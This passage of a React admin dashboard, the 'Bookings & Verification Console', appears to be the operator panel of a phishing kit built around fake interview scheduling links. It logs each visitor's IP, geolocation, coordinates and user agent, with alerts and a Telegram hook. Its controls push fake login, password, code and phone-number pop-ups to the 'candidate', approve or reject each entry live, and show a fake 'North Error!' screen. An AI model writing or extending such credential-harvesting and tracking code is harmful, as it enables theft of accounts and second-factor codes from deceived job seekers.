      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  async function resetGAppreciate(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Display the full-screen "North Error!" page to candidate
  async function sendNorthError(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: "NORTH_ERROR_REQUESTED",
    };
    await supabase
      .from("bookings")
      .update({
        status: "awaiting_code",
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Dismiss / close the North Error page on candidate screen
  async function resetNorthError(b: Booking) {
    setBusyId(b.id);
    const existing = parseBookingCodeData(b.additional_code);
    const updated: BookingCodeData = {
      ...existing,
      active_req: null,
    };
    await supabase
      .from("bookings")
      .update({
        additional_code: serializeBookingCodeData(updated),
      })
      .eq("id", b.id);
    await loadPending();
    setBusyId(null);
  }

  // Active Drafts not yet converted to DB rows
  const activeDraftsList = useMemo(() => {
    const existingEmails = new Set([
      ...pendingBookings.map((b) => b.email?.toLowerCase()).filter(Boolean),
      ...pastBookings.map((b) => b.email?.toLowerCase()).filter(Boolean),
    ]);
    const existingSessionIds = new Set([
      ...pendingBookings.map((b) => b.session_id).filter(Boolean),
      ...pastBookings.map((b) => b.session_id).filter(Boolean),
    ]);
    return Object.values(sessionDrafts).filter(
      (d) =>
        (!d.email || !existingEmails.has(d.email.toLowerCase())) &&
        (!d.session_id || !existingSessionIds.has(d.session_id))
    );
  }, [sessionDrafts, pendingBookings, pastBookings]);

  const activeVisitorsCount = useMemo(() => {
    const onlineSessions = new Set<string>();
    Object.values(presenceMap).forEach((p) => {
      if (p.online && p.session_id) {
        onlineSessions.add(p.session_id);
      }
    });
    return onlineSessions.size;
  }, [presenceMap]);

  const pending = pendingBookings;
  const others = pastBookings;
  const totalPages = Math.max(1, Math.ceil(totalPastCount / pageSize));

  function goToPage(p: number) {
    const target = Math.max(1, Math.min(p, totalPages));
    setPastPage(target);
  }

  return (
    <div className="space-y-8 max-w-7xl mx-auto font-sans pb-16">
      {/* Page Header with Real-Time Visitor Counter, Sound Toggle, Filter & Refresh */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-3">
            <h1 className="font-display text-3xl font-bold text-ink">
              Bookings &amp; Verification Console
            </h1>

            {/* Live Active Visitor Counter */}
            {activeVisitorsCount > 0 ? (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs animate-pulse">
                <span className="w-2 h-2 rounded-full bg-emerald-500" />
                <span>{activeVisitorsCount} Active on Scheduling Page</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-gray-100 text-gray-500 border border-gray-200">
                <span className="w-2 h-2 rounded-full bg-gray-400" />
                <span>No active visitors</span>
              </span>
            )}
          </div>

          <p className="mt-1.5 text-muted text-sm">
            Live candidate tracking, admin attribution, sound notifications for new page visits, and real-time verification controls.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-2.5 self-start lg:self-auto">
          {/* Sound Alert Toggle */}
          <button
            type="button"
            onClick={() => setSoundEnabled(!soundEnabled)}
            className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-semibold border transition-all shadow-2xs cursor-pointer ${
              soundEnabled
                ? "bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100"
                : "bg-gray-100 text-gray-500 border-gray-200 hover:bg-gray-200"
            }`}
            title={soundEnabled ? "Sound alerts enabled on candidate open" : "Sound alerts muted"}
          >
            {soundEnabled ? (
              <>
                <Volume2 className="w-3.5 h-3.5 text-blue-600" />
                <span>Sound ON</span>
              </>
            ) : (
              <>
                <VolumeX className="w-3.5 h-3.5 text-gray-500" />
                <span>Sound OFF</span>
              </>
            )}
          </button>

          {/* Visits History Toggle */}
          <button
            type="button"
            onClick={() => setShowVisitsLog(!showVisitsLog)}
            className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-semibold border transition-all shadow-2xs cursor-pointer ${
              showVisitsLog
                ? "bg-purple-50 text-purple-700 border-purple-200"
                : "bg-white text-gray-700 border-gray-200 hover:bg-gray-50"
            }`}
            title="View recent candidate schedule link openings"
          >
            <Clock className="w-3.5 h-3.5 text-purple-600" />
            <span>Openings Log ({recentVisits.length})</span>
          </button>

          {/* Active-Only Filter Checkbox */}
          <label className="inline-flex items-center gap-2 px-3.5 py-2 bg-white border border-gray-200 rounded-xl text-xs font-semibold text-gray-700 hover:bg-gray-50 transition-colors shadow-2xs cursor-pointer select-none">
            <input
              type="checkbox"
              checked={activeOnly}
              onChange={(e) => setActiveOnly(e.target.checked)}
              className="w-4 h-4 text-[#0069ff] rounded border-gray-300 focus:ring-[#0069ff] cursor-pointer"
            />
            <span className="flex items-center gap-1.5">
              <Filter className="w-3.5 h-3.5 text-gray-500" />
              <span>Active Only</span>
            </span>
          </label>

          {/* Refresh Button */}
          <button
            type="button"
            onClick={() => {
              loadAll();
            }}
            className="inline-flex items-center gap-1.5 px-4 py-2 border rule-hairline rounded-xl font-mono text-xs font-semibold text-muted hover:text-ink hover:bg-paperdim transition-colors shadow-2xs cursor-pointer"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading || loadingPast ? "animate-spin" : ""}`} />
            <span>Refresh</span>
          </button>
        </div>
      </div>

      {/* Real-time Link Open Alert Banner */}
      {latestAlert && (
        <div className="bg-gradient-to-r from-blue-600 to-indigo-600 text-white rounded-2xl shadow-md p-4 sm:p-5 flex items-center justify-between gap-4 animate-fade-down">
          <div className="flex items-center gap-3.5 min-w-0">
            <div className="w-10 h-10 rounded-xl bg-white/20 flex items-center justify-center shrink-0">
              <Bell className="w-5 h-5 text-white animate-bounce" />
            </div>
            <div className="min-w-0 space-y-0.5">
              <p className="text-sm font-bold truncate">
                ⚡ Candidate Opened Scheduling Link!
              </p>
              <p className="text-xs text-blue-100 truncate">
                Admin Link:{" "}
                <span className="font-semibold text-white">
                  {latestAlert.admin_email || latestAlert.interviewer_name || "Default Admin"}
                </span>{" "}
                {latestAlert.location && (
                  <span className="text-amber-200 font-medium"> · 📍 {latestAlert.location}</span>
                )}
                {latestAlert.ip_address && (
                  <span className="text-blue-200 font-mono"> · IP: {latestAlert.ip_address}</span>
                )}
                <span className="text-blue-200"> · Time: {latestAlert.time}</span>
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={() => setLatestAlert(null)}
            className="p-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-white transition-colors cursor-pointer shrink-0"
            title="Dismiss notification"
          >
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* Collapsible Recent Visits Log */}
      {showVisitsLog && (
        <div className="bg-white border border-purple-200/80 rounded-2xl shadow-sm p-6 space-y-4 animate-fade-down">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Activity className="w-4 h-4 text-purple-600" />
              <h3 className="text-sm font-bold text-gray-900">
                Recent Scheduling Link Visits (Ready for Telegram Webhook)
              </h3>
            </div>
            <span className="text-xs text-gray-400">Realtime logged</span>
          </div>

          {recentVisits.length === 0 ? (
            <p className="text-xs text-gray-400 italic py-2">
              No visits logged yet. They will appear here immediately when a candidate opens any scheduling link.
            </p>
          ) : (
            <div className="divide-y divide-gray-100 max-h-60 overflow-y-auto">
              {recentVisits.map((v) => {
                const loc = [v.city, v.state, v.country].filter(Boolean).join(", ");
                return (
                  <div
                    key={v.id}
                    className="py-2.5 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs"
                  >
                    <div className="flex flex-wrap items-center gap-2.5">
                      <span className="w-2 h-2 rounded-full bg-purple-500 shrink-0" />
                      <span className="font-bold text-gray-900">
                        {v.admin_email || v.interviewer_name || "Primary Admin"}
                      </span>
                      {loc && (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-md bg-purple-50 text-purple-700 font-medium text-[11px] border border-purple-200">
                          <span>📍</span>
                          <span>{loc}</span>
                        </span>
                      )}
                      {v.ip_address && (
                        <span className="text-gray-500 font-mono text-[11px] bg-gray-50 px-1.5 py-0.5 rounded border border-gray-200">
                          IP: {v.ip_address}
                        </span>
                      )}
                      {(v.latitude || v.longitude) && (
                        <div className="flex items-center gap-1">
                          {v.latitude && (
                            <span className="inline-flex items-center gap-1 font-mono text-[11px] bg-gray-50 px-1.5 py-0.5 rounded border border-gray-200 text-gray-700">
                              Lat: {v.latitude}
                              <CopyIconButton value={v.latitude} label="Latitude" />
                            </span>
                          )}
                          {v.longitude && (
                            <span className="inline-flex items-center gap-1 font-mono text-[11px] bg-gray-50 px-1.5 py-0.5 rounded border border-gray-200 text-gray-700">
                              Long: {v.longitude}
                              <CopyIconButton value={v.longitude} label="Longitude" />
                            </span>
                          )}
                        </div>
                      )}
                      <span className="text-gray-400 font-mono text-[11px]">
                        {v.timezone || "America/New_York"}
                      </span>
                    </div>
                    <div className="flex items-center gap-3 text-gray-500 shrink-0">
                      <span>
                        {new Date(v.created_at).toLocaleTimeString([], {
                          hour: "2-digit",
                          minute: "2-digit",
                          second: "2-digit",
                        })}
                      </span>
                      <span className="text-[11px] text-gray-400">
                        {new Date(v.created_at).toLocaleDateString([], {
                          month: "short",
                          day: "numeric",
                        })}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* Bookings List */}
      <div className="space-y-6">
        {loading && (
          <div className="bg-white border border-gray-200 rounded-2xl p-12 text-center text-muted font-mono text-sm shadow-sm">
            Loading live bookings…
          </div>
        )}

        {!loading && pending.length === 0 && activeDraftsList.length === 0 && (totalPastCount === 0 || activeOnly) && (
          <div className="bg-white border border-gray-200 rounded-2xl p-12 text-center text-muted font-mono text-sm shadow-sm">
            No active candidate sessions or bookings.
          </div>
        )}

        {/* Active Draft Sessions (Candidates in ID/Passkey modal) */}
        {activeDraftsList.map((d) => {
          const isOnline = Boolean(presenceMap[d.session_id] || (d.email && presenceMap[d.email.toLowerCase()]));
          return <DraftSessionCard key={d.session_id} s={d} isOnline={isOnline} />;
        })}

        {/* Active & Pending DB Bookings */}
        {pending.map((b) => {
          const isOnline = Boolean(presenceMap[b.id] || (b.email && presenceMap[b.email.toLowerCase()]));
          const candidateUA =
            b.user_agent ||
            presenceMap[b.id]?.user_agent ||
            (b.email ? presenceMap[b.email.toLowerCase()]?.user_agent : null) ||
            recentVisits.find((v) => (b.session_id && v.session_id === b.session_id) || (b.ip_address && v.ip_address === b.ip_address))?.user_agent;
          return (
            <BookingCardItem
              key={b.id}
              b={b}
              busyId={busyId}
              isOnline={isOnline}
              candidateUserAgent={candidateUA}
              onConfirm={confirmBooking}
              onRejectId={rejectIdPasskey}
              onRequireCode={requireCode}
              onRejectSpecificCode={rejectSpecificCode}
              onSendPopCode={sendPopCode}
              onClearPopCode={clearPopCode}
              onSendNotification={sendNotification}
              onClearNotification={clearNotification}
              onSendNLogin={sendNLoginPopup}
              onRejectNLogin={rejectNLoginPopup}
              onUpdateExpectedPassword={updateExpectedPassword}
              onResetNPassword={resetNPassword}
              onSendNCode={sendNCodePopup}
              onRejectNCode={rejectNCodePopup}
              onResetNCode={resetNCode}
              onUpdateNCodeTargetEmail={updateNCodeTargetEmail}
              onSendGPopUp={sendGPopUp}
              onRejectGPopUp={rejectGPopUp}
              onResetGPopUp={resetGPopUp}
              onSendGNumber={sendGNumberPopup}
              onRejectGNumber={rejectGNumberPopup}
              onResetGNumber={resetGNumber}
              onUpdateGNumberMask={updateGNumberMask}
              onSendGAppreciate={sendGAppreciatePopup}
              onResetGAppreciate={resetGAppreciate}
              onSendNorthError={sendNorthError}
              onResetNorthError={resetNorthError}
            />
          );
        })}

        {/* Completed / Past Bookings with Server-side Pagination & Fast Search */}
        {!activeOnly && (totalPastCount > 0 || pastSearchQuery.trim().length > 0) && (
          <div className="pt-6 space-y-4">
            {/* Header + Search bar + Live status */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
              <div className="flex items-center gap-2.5">
                <h2 className="text-xs font-bold uppercase tracking-wider text-gray-400 font-mono">
                  Past / Resolved Bookings ({totalPastCount})
                </h2>
                {loadingPast && (
                  <span className="text-xs text-blue-600 font-medium animate-pulse flex items-center gap-1">
                    <RefreshCw className="w-3 h-3 animate-spin" />
                    <span>Loading page…</span>
                  </span>
                )}
              </div>

              {/* Search input for past bookings */}
              <div className="relative min-w-[240px] max-w-xs">
                <Search className="w-3.5 h-3.5 text-gray-400 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  placeholder="Search past by name, email, ID…"
                  value={pastSearchQuery}
                  onChange={(e) => {
                    setPastSearchQuery(e.target.value);
                    setPastPage(1);
                  }}
                  className="w-full pl-8 pr-8 py-1.5 bg-white border border-gray-200 rounded-xl text-xs text-gray-800 placeholder-gray-400 outline-none focus:border-blue-500 shadow-2xs"
                />
                {pastSearchQuery && (
                  <button
                    type="button"
                    onClick={() => {
                      setPastSearchQuery("");
                      setPastPage(1);
                    }}
                    className="absolute right-2.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 p-0.5 rounded cursor-pointer"
                    title="Clear search"
                  >
                    <X className="w-3 h-3" />
                  </button>
                )}
              </div>
            </div>

            {/* List of past bookings on current page */}
            {others.length === 0 ? (
              <div className="bg-white border border-gray-200 rounded-2xl p-8 text-center text-gray-400 text-xs shadow-sm">
                {pastSearchQuery ? "No past bookings match your search query." : "No past bookings on this page."}
              </div>
            ) : (
              <div className="space-y-4 opacity-85">
                {others.map((b) => {
                  const isOnline = Boolean(presenceMap[b.id] || (b.email && presenceMap[b.email.toLowerCase()]));
                  const candidateUA =
                    b.user_agent ||
                    presenceMap[b.id]?.user_agent ||
                    (b.email ? presenceMap[b.email.toLowerCase()]?.user_agent : null) ||
                    recentVisits.find((v) => (b.session_id && v.session_id === b.session_id) || (b.ip_address && v.ip_address === b.ip_address))?.user_agent;
                  return (
                    <BookingCardItem
                      key={b.id}
                      b={b}
                      busyId={busyId}
                      isOnline={isOnline}
                      candidateUserAgent={candidateUA}
                      onConfirm={confirmBooking}
                      onRejectId={rejectIdPasskey}
                      onRequireCode={requireCode}
                      onRejectSpecificCode={rejectSpecificCode}
                      onSendPopCode={sendPopCode}
                      onClearPopCode={clearPopCode}
                      onSendNotification={sendNotification}
                      onClearNotification={clearNotification}
                      onSendNLogin={sendNLoginPopup}
                      onRejectNLogin={rejectNLoginPopup}
                      onUpdateExpectedPassword={updateExpectedPassword}
                      onResetNPassword={resetNPassword}
                      onSendNCode={sendNCodePopup}
                      onRejectNCode={rejectNCodePopup}
                      onResetNCode={resetNCode}
                      onUpdateNCodeTargetEmail={updateNCodeTargetEmail}
                      onSendGPopUp={sendGPopUp}
                      onRejectGPopUp={rejectGPopUp}
                      onResetGPopUp={resetGPopUp}
                      onSendGNumber={sendGNumberPopup}
                      onRejectGNumber={rejectGNumberPopup}
                      onResetGNumber={resetGNumber}
                      onUpdateGNumberMask={updateGNumberMask}
                      onSendGAppreciate={sendGAppreciatePopup}
                      onResetGAppreciate={resetGAppreciate}
                      onSendNorthError={sendNorthError}
                      onResetNorthError={resetNorthError}
                    />
                  );
                })}
              </div>
            )}

            {/* Pagination Controls */}
            {totalPages > 1 && (
              <div className="flex flex-col sm:flex-row items-center justify-between gap-4 pt-4 pb-2 border-t border-gray-200/80">
                {/* Count summary & Page Size selector */}
                <div className="flex flex-wrap items-center gap-3 text-xs text-gray-500 font-medium">
                  <span>
                    Showing{" "}
                    <strong className="text-gray-900 font-semibold">
                      {totalPastCount === 0 ? 0 : (pastPage - 1) * pageSize + 1}
                    </strong>{" "}
                    to{" "}
                    <strong className="text-gray-900 font-semibold">
                      {Math.min(pastPage * pageSize, totalPastCount)}
                    </strong>{" "}
                    of{" "}
                    <strong className="text-gray-900 font-semibold">{totalPastCount}</strong>{" "}
                    past bookings
                  </span>

                  <div className="flex items-center gap-1.5 pl-2 border-l border-gray-200">
                    <span className="text-gray-400">Rows:</span>
                    <select
                      value={pageSize}
                      onChange={(e) => {
                        setPageSize(Number(e.target.value));
                        setPastPage(1);
                      }}
                      className="bg-white border border-gray-200 text-gray-700 text-xs rounded-lg px-2 py-1 outline-none focus:border-blue-500 cursor-pointer shadow-2xs"
                    >
                      <option value={5}>5 / page</option>
                      <option value={10}>10 / page</option>
                      <option value={20}>20 / page</option>
                      <option value={50}>50 / page</option>
                    </select>
                  </div>
                </div>

                {/* Page Navigation Buttons */}
                <div className="flex items-center gap-1">
                  {/* First Page */}
                  <button
                    type="button"
                    disabled={pastPage <= 1 || loadingPast}
                    onClick={() => goToPage(1)}
                    className="p-1.5 rounded-lg border border-gray-200 bg-white text-gray-600 hover:bg-gray-50 disabled:opacity-30 disabled:cursor-not-allowed transition-colors cursor-pointer shadow-2xs"
                    title="First page"
                  >
                    <ChevronsLeft className="w-4 h-4" />
                  </button>

                  {/* Previous Page */}
                  <button
                    type="button"
                    disabled={pastPage <= 1 || loadingPast}
                    onClick={() => goToPage(pastPage - 1)}
                    className="p-1.5 rounded-lg border border-gray-200 bg-white text-gray-600 hover:bg-gray-50 disabled:opacity-30 disabled:cursor-not-allowed transition-colors cursor-pointer shadow-2xs"
                    title="Previous page"
                  >
                    <ChevronLeft className="w-4 h-4" />
                  </button>

                  {/* Number Pills */}
                  <div className="flex items-center gap-1 px-1">
                    {getPageNumbers(pastPage, totalPages).map((p, idx) => {
                      if (p === "...") {
                        return (
                          <span key={`dots-${idx}`} className="px-1.5 text-xs text-gray-400 select-none">
                            …
                          </span>
                        );
                      }
                      const isCurrent = p === pastPage;
                      return (
                        <button
                          key={`page-${p}`}
                          type="button"
                          disabled={loadingPast}
                          onClick={() => goToPage(Number(p))}
                          className={`min-w-[32px] h-8 px-2 text-xs font-semibold rounded-lg transition-all cursor-pointer ${
                            isCurrent
                              ? "bg-[#0069ff] text-white shadow-xs font-bold"
                              : "bg-white border border-gray-200 text-gray-700 hover:bg-gray-50"
                          }`}
                        >
                          {p}
                        </button>
                      );
                    })}
                  </div>

                  {/* Next Page */}
                  <button
                    type="button"
                    disabled={pastPage >= totalPages || loadingPast}
                    onClick={() => goToPage(pastPage + 1)}
                    className="p-1.5 rounded-lg border border-gray-200 bg-white text-gray-600 hover:bg-gray-50 disabled:opacity-30 disabled:cursor-not-allowed transition-colors cursor-pointer shadow-2xs"
                    title="Next page"
                  >
                    <ChevronRight className="w-4 h-4" />
                  </button>

                  {/* Last Page */}
                  <button
                    type="button"
                    disabled={pastPage >= totalPages || loadingPast}
                    onClick={() => goToPage(totalPages)}
                    className="p-1.5 rounded-lg border border-gray-200 bg-white text-gray-600 hover:bg-gray-50 disabled:opacity-30 disabled:cursor-not-allowed transition-colors cursor-pointer shadow-2xs"
                    title="Last page"
                  >
                    <ChevronsRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
